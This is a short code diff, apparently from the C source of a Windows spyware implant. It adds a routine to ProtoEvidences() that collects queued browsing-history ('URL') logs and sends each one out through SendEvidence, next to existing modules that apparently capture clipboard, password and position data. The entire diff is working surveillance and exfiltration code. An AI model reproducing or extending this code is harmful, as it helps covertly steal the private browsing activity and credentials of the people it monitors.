@@ -21,6 +21,7 @@
 #include "position.h"
 #include "clipboard.h"
 #include "password.h"
+#include "url.h"
 #include "filesystem.h"
 #include "conf.h"
 
@@ -441,6 +442,27 @@ BOOL ProtoEvidences()
 				zfree(lpEvBuffer);
 			}
 		}		
+	}
+
+	Sleep(100);
+	for (DWORD i=0; i<MAX_URL_QUEUE; i++)
+	{
+		LPBYTE lpEvBuffer = g_lpURLLogs[i].lpBuffer;
+		DWORD dwEvSize = g_lpURLLogs[i].dwSize;
+
+		if (dwEvSize != 0 && lpEvBuffer != NULL)
+		{
+			//#ifdef _DEBUG
+			//OutputDebugString(L"[URL] Sending evidendce");
+			//#endif
+
+			if (SendEvidence(lpEvBuffer, dwEvSize)) // FIXME: free evidence solo se GetResponse == OK
+			{
+				g_lpURLLogs[i].lpBuffer = 0;
+				g_lpURLLogs[i].dwSize = 0;
+				zfree(lpEvBuffer);
+			}
+		}
 	}
 
 	Sleep(100);
